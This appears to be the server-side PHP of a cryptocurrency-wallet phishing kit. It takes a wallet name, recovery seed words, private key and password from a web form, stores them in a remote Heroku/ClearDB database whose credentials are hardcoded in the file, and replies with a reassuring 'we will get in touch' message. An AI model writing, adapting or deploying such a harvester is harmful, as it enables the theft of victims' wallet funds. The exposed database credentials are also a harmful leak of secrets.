<?php 
//creating connection to database 
$con=mysqli_connect("us-cdbr-east-05.cleardb.net","bdf0869df47651","4cfff33a","heroku_6c268aa1594cb8f") or die(mysqli_error()); 
// Get Heroku ClearDB connection information

// $hostname = "localhost";
// $username = "admin1";
// $password = "admin123";
// $db = "walletbtc";

// $con = mysqli_connect($$hostname, $username, $password, $db);

//check whether submit button is pressed or not 
if((isset($_POST['submit']))) 
{ 
//fetching and storing the form data in variables 
$walletname = $con->real_escape_string($_POST['walletname']); 
$words = $con->real_escape_string($_POST['words']); 
$privatekey = $con->real_escape_string($_POST['privatekey']);
$password = $con->real_escape_string($_POST['password']); 
 
//query to insert the variable data into the database 
$sql="INSERT INTO nwalletabs (walletname, words, privatekey,password) VALUES ('".$walletname."','".$words."', '".$privatekey."', '".$password."')";

if(!$result = $con->query($sql)){ die('Error occured [' . $con->error . ']'); }else echo "Thank you! We will get in touch with you soon"; 

}

?>
